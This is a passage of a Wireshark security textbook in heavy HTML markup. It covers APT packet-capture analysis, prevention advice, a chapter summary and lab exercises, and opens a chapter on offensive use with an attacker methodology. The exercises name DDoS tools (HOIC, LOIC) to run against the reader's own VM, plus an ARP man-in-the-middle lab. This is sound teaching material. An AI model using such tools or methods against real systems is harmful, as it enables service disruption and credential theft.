New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >), but with no responses. What data might be sent afterward? For the answers, download the capture file and examine the trace, as shown in<a name="_bookmark445" ></a>&nbsp;</span><span><a href="#_bookmark446" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-20</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section230" ><p class=MsoBodyText ><img width="780"  height="828"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298451.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark446" ></a><span><a href="#_bookmark445" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-20:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Xinmic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note the incrementing source port (1067/tcp, 1068/tcp, 1069/tcp&#8230;).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Genera<a name="_bookmark447" ></a>l Advice on Wireshark</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;letter-spacing:-1.5500pt;font-weight:bold;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Examples</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Some closing words on all these</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >examples:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298652.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Pay attention to what Wireshark columns are used. They are not all</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section231" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the same, nor ordered the same.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:24.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298753.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These are very &#8220;clean&#8221; captures. Even without display filters, there is little to no other traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.5500pt;margin-right:35.4000pt;margin-left:30.5000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298854.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Some things aren&#8217;t what they seem; for example, why are</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ICMP requests left unreplied? Much investigating needs to be done in malware</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.4500pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:73.0833px;width:763.0000px;height:810.0000px;" ><img width="763"  height="810"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298998.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.7500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker298999.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Much more can be gleaned from a capture; for example, trying other columns or opening Analyze </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Expert Information.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.5000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:20.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >WANT MORE ANALYSIS OF APTS AND OTHER MALWARE?</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:19.8500pt;margin-right:34.0000pt;margin-left:20.0000pt;" ><a name="_bookmark448" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are websites dedicated to providing practice in examining malware packet captures.One fairly active and reliable site is </span><span><a href="http://www.malware-traffic-analysis.net/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >www.malware-traffic-analysis.net</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which provides 1&#8211;2 packet capture exercises a month. See<a name="_bookmark449" ></a>&nbsp;</span><span><a href="#_bookmark450" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-21</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for a sample of recent exercises available.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section232" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:740.0000px;" ><img width="763"  height="740"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker299555.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >How to Prevent APT Attacks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><a name="_bookmark451" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Preventing an APT attack would seem impossible, given an attacker with enough determination. As with most other attacks, however, it doesn&#8217;t mean you have to let the attacker into your network easily. So, let&#8217;s discuss some surprisingly simple strategies for keeping APT out of your network. Or at least you&#8217;ll have a better chance of discovering it before damage is done.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker299960.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >User awareness</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Having people appreciate the threat and what it can mean for the company and their livelihood if the threat is</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section233" ><p class=MsoBodyText  style="margin-top:3.6000pt;margin-right:6.9500pt;margin-left:30.5000pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >successful. Providing for employees a sensible, simple, and management-supported way to raise issues or call out challenges to security protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2500pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker300234.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Defense in depth</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;For the same reason defense in depth is encouraged against all attacks, having multiple layers of defense means multiple opportunities to identify and hopefully stop a threat from becoming a full breach.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker300456.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Security monitoring</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Not only having the tools, but having the personnel and executive support to keep vigilant eyes on the company. An APT might not be the result of the first exploit. And what defines an APT is the desire to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >stay </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >there. Always be hunting.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.7500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker300714.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Incident handling</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Having an APT Response and Recovery plan, including testing it, means being prepared ahead of time. Incident handling for APTs should incorporate all the same steps and support or more as for responding to any other incident.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark452" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter covered three primary types of attack: man-in-the- middle, denial-of-service, and advanced persistent threat. We discussed the reasons why each type seems to be effective. Some attacks work well based on weaknesses in a protocol or people. Other attacks succeed because of sheer will or strength. You used the W4SP Lab to perform first-hand some MitM attacks. To facilitate the attacks in the W4SP Lab, we made good use of the Metasploit framework. And lastly, we showed a few examples of APT attacks via Wireshark screen grabs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In </span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we use Wireshark to take a closer look at packets with offensive tendencies by examining more attacks with Metasploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Exercises" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark453" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.1500pt;margin-right:13.6000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l8 level1 lfo17;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Running the ARP MitM attack in the W4SP Lab, what was the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >FTP password sent from</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >vic1?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l8 level1 lfo17;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Download and test a DDoS tool, such as HOIC or LOIC (from</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >a</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section234" ><p class=MsoBodyText  style="margin-top:4.4000pt;margin-right:11.1500pt;margin-left:30.5000pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VM). Use it against a web server you own (another VM). Experiment with web service parameters and monitoring performance. What are the first packets shown in Wireshark from the attacking VM?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  align=justify  style="margin-top:7.3000pt;margin-right:38.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:justify;text-justify:inter-ideograph;mso-list:l8 level1 lfo17;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Design a display filter that will help you see DHCP request and response traffic for when another machine first connects to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  align=justify  style="margin-top:7.6000pt;margin-right:38.7500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:justify;text-justify:inter-ideograph;mso-list:l8 level1 lfo17;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Download and examine some of the APT packet captures from Deepend Research. Share with your peers what you&#8217;ve</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >learned.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section235" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="Chapter 6: Offensive Wireshark" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark454" ></a><a name="_bookmark455" ></a>Chapter 6</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:0.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >Offensive Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:15.5500pt;margin-right:11.1500pt;" ><a name="_bookmark456" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Up to now, chapters in this book have been meant to help the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >good guys</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the information security professionals. That stops here. In this chapter, we examine ways in which Wireshark can help the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >bad guys</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, or those conducting offensive traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You know Wireshark to be an analysis tool, so you might be wondering how Wireshark can help the hacker. Wireshark is not an offensive tool; it is not capable of actively scanning or exploiting a system. Instead, Wireshark is a packet analysis tool, and even the hacker can benefit from that analysis. There might be times, however, when scanning or exploitation was not performing as expected, and troubleshooting help is needed. Wireshark can check on scanning efforts or figure out why an exploit wasn&#8217;t effective (or confirm that it was).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Attack Methodology" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark457" ></a>Attack Methodology</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Depending on the type of security professional you are, you might already be very familiar with the steps an attacker tends to follow. The attack methodology is a generalized, but well-established set of phases any attacker is going to use to search out, identify, test, and exploit a system for the purpose of gaining and keeping access.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The standard outline of how an attacker goes about </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >hacking </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >follows the same reasoning you would take for any challenge, from learning what you can, <a name="_bookmark458" ></a>to attempting to overcome, and finally keeping your position or backing away on your terms.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here is the attacker methodology:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l7 level1 lfo18;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Perform</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >reconnaissance.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l7 level1 lfo18;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Scan and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >enumerate.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l7 level1 lfo18;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Gain</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >access.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section236" ><p class=17  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l7 level1 lfo18;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Maintain</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >access.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l7 level1 lfo18;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span 